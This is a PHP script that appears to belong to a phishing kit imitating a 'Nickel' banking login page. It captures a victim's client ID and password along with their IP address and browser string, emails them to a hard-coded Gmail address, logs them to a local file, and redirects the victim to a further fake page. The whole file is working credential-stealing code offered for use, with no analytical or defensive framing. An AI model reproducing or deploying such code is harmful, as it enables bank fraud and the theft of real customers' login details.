<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message  = "---------------------> Jib el 3aze wla ke7aze <---------------------\n";
$message .= "Id client : ".$_POST['ValeurId']."\n";
$message .= "Password : ".$_POST['ctl00$MainContent$txtPassword']."\n";
$message .= "BROWSER     : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "MIME-Version: 1.0\r\n";
$message .= "Content-Transfer-Encoding: 8bit\r\n\r\n";
$message .= "Fr0m $ip             chek: in http://www.geoiptool.com/?IP=$ip   \n";
$send = "tlory86@gmail.com";
$subject = "Login Nickel".$ip;
$headers = "From: Result Nickel <iweb@hscmd.org>";
mail($send,$subject,$message,$headers);
$file = fopen('compteur.txt', 'a');
fwrite($file,$message);
header("Location: adressmail.html?_nfpb=true&_pageLabel=as_demande_code_conf_page&premiereDemande=FALSE");
?>


